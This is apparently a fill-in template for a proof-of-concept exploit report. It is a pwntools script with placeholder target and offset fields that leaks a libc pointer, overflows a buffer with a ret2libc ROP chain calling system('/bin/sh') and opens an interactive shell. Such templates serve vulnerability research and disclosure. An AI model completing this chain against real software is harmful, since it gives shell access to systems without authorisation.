#!/usr/bin/env python3
"""
PoC: {{TITLE}}
Target: {{PRODUCT}} {{VERSION}}
Tested:  {{OS}} ({{KERNEL}}), libc {{LIBC}}
Mitigations: {{MITIGATIONS}}            # ASLR / NX / RELRO / CFI / canary state
Author:  {{AUTHOR}}
Date:    {{DATE}}

Summary
-------
{{SUMMARY}}

Reproducibility
---------------
1. Confirm target version: `{{VERIFY_VERSION_CMD}}`
2. Mitigation state should match the header above. Verify with `checksec`
   on the target binary and `cat /proc/sys/kernel/randomize_va_space`.
3. Run: `python3 {{SCRIPT_NAME}}`
4. Expected: {{EXPECTED_RESULT}}

If the exploit is probabilistic, the success rate is {{SUCCESS_RATE}} and is
affected by {{SUCCESS_FACTORS}}.
"""

from __future__ import annotations

import sys
from pwn import *  # noqa: F401,F403  -- pwntools is the standard exploit toolkit

# ---------------------------------------------------------------------------
# 1. Configuration / addresses (constants up top)
# ---------------------------------------------------------------------------

TARGET_BINARY = "{{TARGET_PATH}}"
LIBC_PATH = "{{LIBC_PATH}}"

# All offsets/gadgets live up here so the report reader can spot-check them.
# Every constant gets a comment saying *why that number*.
OFFSET_BUF_TO_RBP = 0x40            # filler bytes from buffer start to saved RBP
GADGET_POP_RDI    = 0x000000000002a3e5  # `pop rdi ; ret` in libc; via ROPgadget

# ---------------------------------------------------------------------------
# 2. Helper functions
# ---------------------------------------------------------------------------

def banner(stage: str, msg: str) -> None:
    """Loud stage-print so failures during the exploit are obvious."""
    log.info(f"[{stage}] {msg}")


def assert_looks_like_libc(addr: int) -> None:
    """Sanity-check a leaked pointer before we use it. Bail loud on failure."""
    if not (0x7f0000000000 <= addr <= 0x7fffffffffff):
        log.error(f"leaked addr {addr:#x} does not look like a libc pointer; aborting")
        sys.exit(1)


def build_chain(libc_base: int) -> bytes:
    """Construct the ROP chain. Every entry is commented with intent."""
    chain  = b""
    chain += p64(libc_base + GADGET_POP_RDI)   # pop rdi ; ret
    chain += p64(libc_base + 0x{{BINSH_OFFSET}})  # &"/bin/sh" inside libc
    chain += p64(libc_base + 0x{{SYSTEM_OFFSET}}) # system()
    return chain


# ---------------------------------------------------------------------------
# 3. Main exploit flow
# ---------------------------------------------------------------------------

def main() -> None:
    # Stage 1 — trigger the bug
    banner("stage 1", "starting target and triggering the vulnerability")
    p = process(TARGET_BINARY)

    # ... vulnerability-specific setup here ...

    # Stage 2 — leak something
    banner("stage 2", "leaking a libc pointer")
    leak = u64(p.recvline().rstrip().ljust(8, b"\x00"))
    assert_looks_like_libc(leak)
    libc_base = leak - 0x{{LIBC_LEAK_OFFSET}}
    log.success(f"libc base: {libc_base:#x}")

    # Stage 3 — corrupt something / pivot
    banner("stage 3", "sending the ROP chain")
    payload  = b"A" * OFFSET_BUF_TO_RBP
    payload += p64(0x4141414141414141)      # saved RBP — overwritten with a fake
    payload += build_chain(libc_base)
    p.sendline(payload)

    # Stage 4 — payload / shell
    banner("stage 4", "interacting with shell (if everything worked)")
    p.interactive()


if __name__ == "__main__":
    main()
